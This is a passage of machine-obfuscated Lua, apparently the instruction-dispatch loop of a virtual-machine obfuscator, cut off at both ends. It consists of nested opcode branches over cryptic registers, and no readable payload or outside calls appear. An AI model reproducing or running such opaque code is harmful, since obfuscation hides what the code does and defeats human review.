if(q<6 or(q==6))then if not(not(5==q))then y=f[n];else w[y[616]][y[222]]=w[y[728]];end else if(q==7 or q<7)then n=n+1;else if not(9==q)then y=f[n];else w[y[616]]=h[y[222]];end end end end else if((q==14)or q<14)then if(q==11 or q<11)then if not(q==11)then n=n+1;else y=f[n];end else if(q<=12)then w[y[616]]=w[y[222]][y[728]];else if(not(14==q))then n=(n+1);else y=f[n];end end end else if(q<=16)then if(q~=16)then w[y[616]][y[222]]=w[y[728]];else n=n+1;end else if(not(q~=17)or q<17)then y=f[n];else if not(19==q)then w[y[616]][y[222]]=w[y[728]];else break end end end end end q=(q+1)end elseif(z==212)then local q=y[616]local x={w[q](w[q+1])};local ba=0;for bb=q,y[728]do ba=(ba+1);w[bb]=x[ba];end else local q,x=0 while true do if(q==7 or q<7)then if(q==3 or q<3)then if(q<1 or q==1)then if not(1==q)then x=nil else w[y[616]][y[222]]=w[y[728]];end else if q==2 then n=(n+1);else y=f[n];end end else if(q<5 or q==5)then if q<5 then w[y[616]]={};else n=(n+1);end else if(6==q)then y=f[n];else w[y[616]][y[222]]=y[728];end end end else if q<=11 then if(q<=9)then if 9>q then n=n+1;else y=f[n];end else if 11>q then w[y[616]][y[222]]=w[y[728]];else n=n+1;end end else if(q<13 or q==13)then if q<13 then y=f[n];else x=y[616]end else if not(15==q)then w[x]=w[x](r(w,x+1,y[222]))else break end end end end q=(q+1)end end;elseif(214>z or 214==z)then w[y[616]]={r({},1,y[222])};elseif not(z~=215)then n=y[222];else if(y[616]<w[y[728]]or y[616]==w[y[728]])then n=n+1;else n=y[222];end;end;elseif z<=228 then if 222>=z then if z<=219 then if z<=217 then w[y[616]]=y[222]*w[y[728]];elseif z<219 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;else w[y[616]]=w[y[222]][y[728]];end;elseif 220>=z then local q;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]]*y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];q=y[616]w[q]=w[q](r(w,q+1,y[222]))elseif z<222 then local q=y[616]w[q](r(w,q+1,y[222]))else w[y[616]]=#w[y[222]];end;elseif z<=225 then if z<=223 then for q=y[616],y[222],1 do w[q]=nil;end;elseif 225~=z then local q=y[616]local x,ba=i(w[q](w[q+1]))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;else local q;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];q=y[616]w[q](r(w,q+1,y[222]))end;elseif z<=226 then a(c,e);elseif z==227 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;else if(w[y[616]]<=w[y[728]])then n=n+1;else n=y[222];end;end;elseif z<=234 then if 231>=z then if z<=229 then local q;w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];q=y[616]w[q]=w[q](r(w,q+1,y[222]))elseif 230<z then local q;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];q=y[616]w[q]=w[q](w[q+1])else w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;end;elseif z<=232 then local q;local x;local ba;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];ba=y[616]x={w[ba](w[ba+1])};q=0;for bb=ba,y[728]do q=q+1;w[bb]=x[q];end elseif 234>z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];for q=y[616],y[222],1 do w[q]=nil;end;n=n+1;y=f[n];n=y[222];else local q;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];q=y[616]w[q]=w[q](w[q+1])end;elseif z<=237 then if z<=235 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+y[728];n=n+1;y=f[n];h[y[222]]=w[y[616]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;elseif 236<z then local q;local x;local ba;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[222];x=y[728];q=k(w,g,ba,x);w[y[616]]=q;else local q=y[616];local x=y[728];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[222];else n=n+1 end;end;elseif z<=238 then local q=y[616]local x={w[q](r(w,q+1,y[222]))};local ba=0;for bb=q,y[728]do ba=(ba+1);w[bb]=x[ba];end;elseif 239==z then local q=y[616]local i,x=i(w[q](r(w,q+1,y[222])))p=x+q-1 local x=0;for ba=q,p do x=x+1;w[ba]=i[x];end;else if not w[y[616]]then n=n+1;else n=y[222];end;end;elseif z<=264 then if 252>=z then if(z==246 or z<246)then if(z<243 or z==243)then if((241>z)or(241==z))then local i=0 while true do if i<=14 then if(i<=6)then if(i<2 or i==2)then if(i==0 or i<0)then w={};else if(1==i)then for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;else n=n+1;end end else if(i<4 or i==4)then if i~=4 then y=f[n];else w[y[616]]=h[y[222]];end else if not(5~=i)then n=n+1;else y=f[n];end end end else if(i<=10)then if(i==8 or i<8)then if i~=8 then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(10>i)then y=f[n];else w[y[616]]=h[y[222]];end end else if(i==12 or i<12)then if(i==11)then n=n+1;else y=f[n];end else if not(14==i)then w[y[616]]={};else n=(n+1);end end end end else if(i==21 or i<21)then if(i<=17)then if(i<=15)then y=f[n];else if not(i~=16)then w[y[616]]={};else n=n+1;end end else if(i<=19)then if(i>18)then w[y[616]][y[222]]=w[y[728]];else y=f[n];end else if not(i==21)then n=(n+1);else y=f[n];end end end else if i<=25 then if(i==23 or i<23)then if not(i~=22)then w[y[616]]=j[y[222]];else n=(n+1);end else if 24==i then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if(i<27 or i==27)then if(27~=i)then n=(n+1);else y=f[n];end else if not(29==i)then if w[y[616]]then n=n+1;else n=y[222];end;else break end end end end end i=(i+1)end elseif(242<z)then w[y[616]]=w[y[222]][y[728]];else local i=y[616];w[i]=(w[i]-w[(i+2)]);n=y[222];end;elseif((z==244)or z<244)then local i,q=0 while true do if((i==8)or i<8)then if(i<=3)then if(i==1 or i<1)then if(1>i)then q=nil else w[y[616]]=w[y[222]][y[728]];end else if 2==i then n=(n+1);else y=f[n];end end else if(i==5 or i<5)then if not(4~=i)then w[y[616]]=h[y[222]];else n=(n+1);end else if(i==6 or i<6)then y=f[n];else if not(i~=7)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end end end end else if i<=13 then if(i==10 or i<10)then if i>9 then w[y[616]]=y[222];else y=f[n];end else if i<=11 then n=(n+1);else if not(i~=12)then y=f[n];else w[y[616]]=y[222];end end end else if(i==15 or i<15)then if(i<15)then n=n+1;else y=f[n];end else if((i<16)or(i==16))then q=y[616]else if(i<18)then w[q]=w[q](r(w,q+1,y[222]))else break end end end end end i=(i+1)end elseif not(z==246)then local i,q=0 while true do if i<=8 then if(i<3 or i==3)then if(i<=1)then if i>0 then w[y[616]]=j[y[222]];else q=nil end else if i>2 then y=f[n];else n=n+1;end end else if(i<5 or i==5)then if(i<5)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if(i<6 or i==6)then y=f[n];else if(i<8)then w[y[616]]=y[222];else n=(n+1);end end end end else if i<=13 then if(i==10 or i<10)then if(9==i)then y=f[n];else w[y[616]]=y[222];end else if i<=11 then n=n+1;else if(12==i)then y=f[n];else w[y[616]]=y[222];end end end else if(i<15 or i==15)then if 15>i then n=(n+1);else y=f[n];end else if(i<=16)then q=y[616]else if i<18 then w[q]=w[q](r(w,q+1,y[222]))else break end end end end end i=i+1 end else local i,q,x,ba=0 while true do if(i<=9)then if(i<=4)then if i<=1 then if(i>0)then x=nil else q=nil end else if(i<2 or i==2)then ba=nil else if not(i~=3)then w[y[616]]=h[y[222]];else n=(n+1);end end end else if(i<=6)then if not(6==i)then y=f[n];else w[y[616]]=h[y[222]];end else if(i==7 or i<7)then n=(n+1);else if i<9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if i<=14 then if i<=11 then if i~=11 then n=n+1;else y=f[n];end else if(i<=12)then w[y[616]]=w[y[222]][w[y[728]]];else if not(i==14)then n=n+1;else y=f[n];end end end else if(i==16 or i<16)then if(i<16)then ba=y[616]else x={w[ba](w[ba+1])};end else if i<=17 then q=0;else if(18<i)then break else for bb=ba,y[728]do q=q+1;w[bb]=x[q];end end end end end end i=(i+1)end end;elseif(z<249 or z==249)then if(z<=247)then local i,q=0 while true do if(i<7 or i==7)then if(i==3 or i<3)then if i<=1 then if(i~=1)then q=nil else w[y[616]]=h[y[222]];end else if not(3==i)then n=(n+1);else y=f[n];end end else if i<=5 then if(5>i)then w[y[616]]=y[222];else n=(n+1);end else if i~=7 then y=f[n];else w[y[616]]=y[222];end end end else if(i<=11)then if(i<=9)then if i<9 then n=n+1;else y=f[n];end else if 11~=i then w[y[616]]=y[222];else n=n+1;end end else if(i<13 or i==13)then if(13~=i)then y=f[n];else q=y[616]end else if not(15==i)then w[q]=w[q](r(w,q+1,y[222]))else break end end end end i=(i+1)end elseif(z>248)then w[y[616]]=j[y[222]];else w[y[616]]=false;end;elseif(z<=250)then local i,q=0 while true do if i<=13 then if i<=6 then if i<=2 then if i<=0 then q=nil else if i>1 then n=n+1;else w[y[616]]={};end end else if i<=4 then if 4>i then y=f[n];else w[y[616]]=h[y[222]];end else if i>5 then y=f[n];else n=n+1;end end end else if i<=9 then if i<=7 then w[y[616]]=w[y[222]][y[728]];else if 8==i then n=n+1;else y=f[n];end end else if i<=11 then if i<11 then w[y[616]][y[222]]=w[y[728]];else n=n+1;end else if i==12 then y=f[n];else w[y[616]]=j[y[222]];end end end end else if i<=20 then if i<=16 then if i<=14 then n=n+1;else if i>15 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end else if i<=18 then if i<18 then n=n+1;else y=f[n];end else if 19<i then n=n+1;else w[y[616]]=j[y[222]];end end end else if i<=23 then if i<=21 then y=f[n];else if 22==i then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if i<=25 then if 24==i then y=f[n];else q=y[616]end else if 27~=i then w[q]=w[q]()else break end end end end end i=i+1 end elseif not(z~=251)then local i,q,x,ba=0 while true do if i<=9 then if i<=4 then if i<=1 then if 1~=i then q=nil else x=nil end else if i<=2 then ba=nil else if i==3 then w[y[616]]=h[y[222]];else n=n+1;end end end else if i<=6 then if i~=6 then y=f[n];else w[y[616]]=h[y[222]];end else if i<=7 then n=n+1;else if i<9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if i<=14 then if i<=11 then if i>10 then y=f[n];else n=n+1;end else if i<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if 13<i then y=f[n];else n=n+1;end end end else if i<=16 then if i~=16 then ba=y[616]else x={w[ba](w[ba+1])};end else if i<=17 then q=0;else if 18<i then break else for bb=ba,y[728]do q=q+1;w[bb]=x[q];end end end end end end i=i+1 end else w[y[616]]=h[y[222]];end;elseif 258>=z then if z<=255 then if 253>=z then local i;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];i=y[616]w[i]=w[i]()elseif z>254 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;else local i;local q;local x;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];x=y[616]q={w[x](w[x+1])};i=0;for ba=x,y[728]do i=i+1;w[ba]=q[i];end end;elseif 256>=z then local i;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))elseif 257<z then w={};for i=0,u,1 do if i<o then w[i]=s[i+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;else local i=y[616];w[i]=w[i]-w[i+2];n=y[222];end;elseif 261>=z then if z<=259 then w[y[616]]=w[y[222]]%y[728];elseif z~=261 then if(y[616]<w[y[728]])then n=n+1;else n=y[222];end;else local i;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))end;elseif z<=262 then local i;w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))elseif 263<z then w[y[616]]=w[y[222]]-y[728];else local i;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]]*y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))end;elseif 276>=z then if 270>=z then if z<=267 then if 265>=z then if(w[y[616]]~=w[y[728]])then n=y[222];else n=n+1;end;elseif 266==z then w[y[616]]=(not w[y[222]]);else local i=y[222];local q=y[728];local i=k(w,g,i,q);w[y[616]]=i;end;elseif z<=268 then local i;local q;local x;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];x=y[616]q={w[x](w[x+1])};i=0;for ba=x,y[728]do i=i+1;w[ba]=q[i];end elseif 269==z then w[y[616]]=w[y[222]]-w[y[728]];else local i=y[616];do return w[i](r(w,i+1,y[222]))end;end;elseif z<=273 then if z<=271 then local i=y[616];local q=w[y[222]];w[i+1]=q;w[i]=q[w[y[728]]];elseif 272==z then w[y[616]]=w[y[222]]*y[728];else if(w[y[616]]~=w[y[728]])then n=y[222];else n=n+1;end;end;elseif z<=274 then local i,q=0 while true do if(i==7 or i<7)then if(i<=3)then if(i==1 or i<1)then if not(0~=i)then q=nil else w[y[616]]=h[y[222]];end else if not(i==3)then n=n+1;else y=f[n];end end else if(i==5 or i<5)then if(4<i)then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if 7>i then y=f[n];else w[y[616]]=y[222];end end end else if(i<11 or i==11)then if(i<=9)then if i<9 then n=(n+1);else y=f[n];end else if not(10~=i)then w[y[616]]=y[222];else n=(n+1);end end else if i<=13 then if i<13 then y=f[n];else q=y[616]end else if(15>i)then w[q]=w[q](r(w,(q+1),y[222]))else break end end end end i=(i+1)end elseif 276>z then local i;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))else do return w[y[616]]end end;elseif 282>=z then if 279>=z then if z<=277 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];elseif z<279 then local i;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))else local i;local q;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];q=y[616];i=w[q];for x=q+1,y[222]do t(i,w[x])end;end;elseif z<=280 then local i;local q;local x;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];x=y[616]q={w[x](w[x+1])};i=0;for ba=x,y[728]do i=i+1;w[ba]=q[i];end elseif 281<z then local i;local q;local x;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];x=y[222];q=y[728];i=k(w,g,x,q);w[y[616]]=i;else local i;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))end;elseif 285>=z then if 283>=z then w[y[616]]=w[y[222]]*y[728];elseif 285>z then if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;else local i;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];i=y[616]w[i]=w[i](w[i+1])end;elseif 286>=z then local i=y[616];local q,x,ba=w[i],w[i+1],w[i+2];local q=q+ba;w[i]=q;if ba>0 and q<=x or ba<0 and q>=x then n=y[222];w[i+3]=q;end;elseif z~=288 then w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];else local i;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];i=y[616]w[i]=w[i](r(w,i+1,y[222]))end;elseif z<=336 then if 312>=z then if z<=300 then if(294>z or 294==z)then if 291>=z then if(z<=289)then local i,q=0 while true do if i<=10 then if i<=4 then if i<=1 then if i>0 then w[y[616]]=h[y[222]];else q=nil end else if i<=2 then n=n+1;else if i~=4 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if i<=7 then if i<=5 then n=n+1;else if i==6 then y=f[n];else w[y[616]]=h[y[222]];end end else if i<=8 then n=n+1;else if i==9 then y=f[n];else w[y[616]]=w[y[222]][w[y[728]]];end end end end else if i<=15 then if i<=12 then if 12>i then n=n+1;else y=f[n];end else if i<=13 then w[y[616]]=h[y[222]];else if i<15 then n=n+1;else y=f[n];end end end else if i<=18 then if i<=16 then w[y[616]]=w[y[222]][y[728]];else if 18>i then n=n+1;else y=f[n];end end else if i<=19 then q=y[616]else if 20==i then w[q]=w[q](r(w,q+1,y[222]))else break end end end end end i=i+1 end elseif(291~=z)then w[y[616]]();else local i,q=0 while true do if i<=11 then if i<=5 then if i<=2 then if i<=0 then q=nil else if i==1 then w[y[616]]=w[y[222]]%w[y[728]];else n=n+1;end end else if i<=3 then y=f[n];else if 4==i then w[y[616]]=w[y[222]]+y[728];else n=n+1;end end end else if i<=8 then if i<=6 then y=f[n];else if i>7 then n=n+1;else w[y[616]]=h[y[222]];end end else if i<=9 then y=f[n];else if 10<i then n=n+1;else w[y[616]]=w[y[222]];end end end end else if i<=17 then if i<=14 then if i<=12 then y=f[n];else if i>13 then n=n+1;else w[y[616]]=w[y[222]];end end else if i<=15 then y=f[n];else if 17~=i then w[y[616]]=w[y[222]];else n=n+1;end end end else if i<=20 then if i<=18 then y=f[n];else if 20~=i then w[y[616]]=w[y[222]];else n=n+1;end end else if i<=22 then if i==21 then y=f[n];else q=y[616]end else if i~=24 then w[q]=w[q](r(w,q+1,y[222]))else break end end end end end i=i+1 end end;elseif(292==z or 292>z)then do return end;elseif not(294==z)then local i,q=0 while true do if i<=8 then if i<=3 then if i<=1 then if 0<i then w[y[616]]=w[y[222]][y[728]];else q=nil end else if i>2 then y=f[n];else n=n+1;end end else if i<=5 then if 5~=i then w[y[616]]=h[y[222]];else n=n+1;end else if i<=6 then y=f[n];else if i<8 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if i<=13 then if i<=10 then if 9<i then w[y[616]]=y[222];else y=f[n];end else if i<=11 then n=n+1;else if 13>i then y=f[n];else w[y[616]]=y[222];end end end else if i<=15 then if 15>i then n=n+1;else y=f[n];end else if i<=16 then q=y[616]else if 18>i then w[q]=w[q](r(w,q+1,y[222]))else break end end end end end i=i+1 end else local i=y[616]w[i]=w[i](w[i+1])end;elseif 297>=z then if(295>z or 295==z)then local i,q=0 while true do if i<=7 then if i<=3 then if i<=1 then if i~=1 then q=nil else w[y[616]]=w[y[222]][y[728]];end else if 3>i then n=n+1;else y=f[n];end end else if i<=5 then if i>4 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if 6==i then y=f[n];else w[y[616]]=h[y[222]];end end end else if i<=11 then if i<=9 then if 9>i then n=n+1;else y=f[n];end else if 10==i then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if i<=13 then if i<13 then y=f[n];else q=y[616]end else if i<15 then w[q]=w[q](r(w,q+1,y[222]))else break end end end end i=i+1 end elseif(297~=z)then w[y[616]]=w[y[222]]+y[728];else local i,q=0 while true do if i<=7 then if i<=3 then if i<=1 then if i==0 then q=nil else w[y[616]]=h[y[222]];end else if 2<i then y=f[n];else n=n+1;end end else if i<=5 then if 5>i then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 7~=i then y=f[n];else w[y[616]]=y[222];end end end else if i<=11 then if i<=9 then if i>8 then y=f[n];else n=n+1;end else if 10==i then w[y[616]]=y[222];else n=n+1;end end else if i<=13 then if 13>i then y=f[n];else q=y[616]end else if 14<i then break else w[q]=w[q](r(w,q+1,y[222]))end end end end i=i+1 end end;elseif(z==298 or z<298)then local i=0 while true do if i<=6 then if i<=2 then if i<=0 then w[y[616]]=w[y[222]][y[728]];else if 2~=i then n=n+1;else y=f[n];end end else if i<=4 then if i>3 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if i>5 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end else if i<=9 then if i<=7 then n=n+1;else if i<9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if i<=11 then if i>10 then y=f[n];else n=n+1;end else if i<13 then if w[y[616]]then n=n+1;else n=y[222];end;else break end end end end i=i+1 end elseif 299<z then local i=0 while true do if i<=8 then if i<=3 then if i<=1 then if 0==i then a(c,e);else n=n+1;end else if i>2 then w={};else y=f[n];end end else if i<=5 then if i>4 then n=n+1;else for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end else if i<=6 then y=f[n];else if i~=8 then w[y[616]]=y[222];else n=n+1;end end end end else if i<=12 then if i<=10 then if i>9 then w[y[616]]=j[y[222]];else y=f[n];end else if 11<i then y=f[n];else n=n+1;end end else if i<=14 then if 14>i then w[y[616]]=j[y[222]];else n=n+1;end else if i<=15 then y=f[n];else if i<17 then w[y[616]]=w[y[222]][y[728]];else break end end end end end i=i+1 end else local a,c,e,i=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else e=nil end else if a<=2 then i=nil else if 3<a then n=n+1;else w[y[616]]=h[y[222]];end end end else if a<=6 then if a==5 then y=f[n];else w[y[616]]=h[y[222]];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if a<=14 then if a<=11 then if 